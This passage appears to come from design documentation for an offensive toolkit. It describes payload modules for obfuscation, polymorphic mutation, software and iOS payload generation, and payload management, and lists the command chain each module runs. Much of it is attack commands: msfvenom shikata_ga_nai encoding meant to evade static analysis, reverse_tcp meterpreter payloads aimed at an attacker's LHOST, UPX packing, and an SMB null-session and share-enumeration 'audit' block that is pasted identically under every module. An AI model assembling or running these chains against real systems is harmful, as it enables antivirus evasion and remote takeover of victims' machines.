        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 19. Payload Obfuscation
**ID:** `payload-obfuscation` | **Risk:** HIGH | **File:** `PayloadObfuscationModule.java`
**Tools:** `msfvenom`, `upx`, `donut`, `python3`, `gcc`

#### Execution Modes:

- **`OBFS`** (Short Name: `OBFS`)
    - **Purpose**: Advanced obfuscation of payload code and headers to bypass static analysis.
    - **Input Schema**: `{ input: Path, technique: String }`
    - **Multi-Tool Command Logic**:
        1. `python3 obfuscate_header.py --in <input>` (Header Obfuscation)
        2. `msfvenom -p - -e x64/shikata_ga_nai -i 5 < <input>` (Encoding)
        3. `upx --best <input>` (Compression)
    - **Execution Flow**: Header Obfuscation -> Encoding -> Compression.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 20. Polymorphic Mutation
**ID:** `payload-polymorph-mutate` | **Risk:** HIGH | **File:** `PayloadPolymorphicMutationModule.java`
**Tools:** `msfvenom`, `nasm`, `gcc`, `objdump`, `python3`

#### Execution Modes:

- **`MUTATE`** (Short Name: `MUTATE`)
    - **Purpose**: Real-time polymorphic mutation of payload stubs.
    - **Input Schema**: `{ input: Path, rounds: int }`
    - **Multi-Tool Command Logic**:
        1. `msfvenom -p - -e x86/shikata_ga_nai -i <rounds> -f raw < <input>` (Core Mutation)
        2. `python3 mutate_stubs.py --in <input>` (Stub Mutation)
        3. `objdump -D -b binary -m i386 output.bin` (Validation)
    - **Execution Flow**: Core Mutation -> Stub Mutation -> Validation.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 21. Software Payload Gen
**ID:** `payload-software` | **Risk:** MEDIUM | **File:** `SoftwarePayloadModule.java`
**Tools:** `msfvenom`, `gcc`, `pyinstaller`, `upx`, `nasm`

#### Execution Modes:

- **`GEN`** (Short Name: `GEN`)
    - **Purpose**: Generate payloads targeting specific software vulnerabilities.
    - **Input Schema**: `{ software: String, version: String, lhost: String, lport: int }`
    - **Multi-Tool Command Logic**:
        1. `msfvenom -p <software>/<version>/reverse_tcp LHOST=<lhost> LPORT=<lport>` (Core Software Gen)
        2. `gcc -o loader loader.c` (C-Loader)
        3. `nasm -f win64 stub.asm` (Assembly Logic)
    - **Execution Flow**: Core Software Gen -> C-Loader -> Assembly.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 22. iOS Payload Gen
**ID:** `payload-ios` | **Risk:** HIGH | **File:** `iOSPayloadModule.java`
**Tools:** `msfvenom`, `openssl`, `python3`, `tar`, `find`

#### Execution Modes:

- **`IPA`** (Short Name: `IPA`)
    - **Purpose**: Generate iOS-compatible IPA payloads with embedded certificates.
    - **Input Schema**: `{ lhost: String, lport: int }`
    - **Multi-Tool Command Logic**:
        1. `msfvenom -p apple_ios/meterpreter/reverse_tcp LHOST=<lhost> LPORT=<lport> -f ipa` (Core IPA Gen)
        2. `openssl req -new -x509 -days 365 -out cert.pem` (Cert Gen)
        3. `tar -cvf payload.tar cert.pem payload.ipa` (Archive)
    - **Execution Flow**: Core IPA Gen -> Cert Gen -> Archive.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 23. Payload Manager
**ID:** `payload-manager` | **Risk:** LOW | **File:** `PayloadManager.java`
**Tools:** `msfvenom`, `msfconsole`, `gcc`, `nasm`, `upx`

#### Execution Modes:

- **`STAT`** (Short Name: `STAT`)
    - **Purpose**: Audit the status and versioning of all payload generation tools.
    - **Input Schema**: `{}`
    - **Multi-Tool Command Logic**:
        1. `msfvenom --version` (Metasploit Check)
        2. `gcc --version` (Compiler Check)
        3. `nasm -v` (Assembler Check)
        4. `upx -V` (Packer Check)
        5. `donut --help` (Donut Check)
    - **Execution Flow**: Metasploit -> Compiler -> Assembler -> Packer -> Donut.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.